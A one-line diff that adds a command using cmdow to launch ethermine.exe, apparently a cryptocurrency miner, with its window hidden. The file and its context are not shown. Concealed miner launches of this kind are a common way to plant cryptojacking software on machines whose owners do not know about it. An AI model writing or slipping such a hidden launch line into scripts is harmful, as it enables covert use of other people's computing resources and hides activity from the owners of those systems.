@@ -1,0 +1,1 @@
+cmdow /run /hid ethermine.exe
